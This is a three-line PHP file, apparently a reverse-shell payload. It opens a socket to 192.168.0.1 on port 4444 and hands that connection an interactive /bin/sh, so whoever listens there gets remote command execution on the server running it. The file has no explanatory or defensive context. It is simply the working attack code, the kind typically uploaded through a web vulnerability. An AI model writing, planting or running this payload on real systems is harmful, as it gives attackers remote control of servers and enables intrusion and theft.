<?php
$sock=fsockopen("192.168.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");
?>
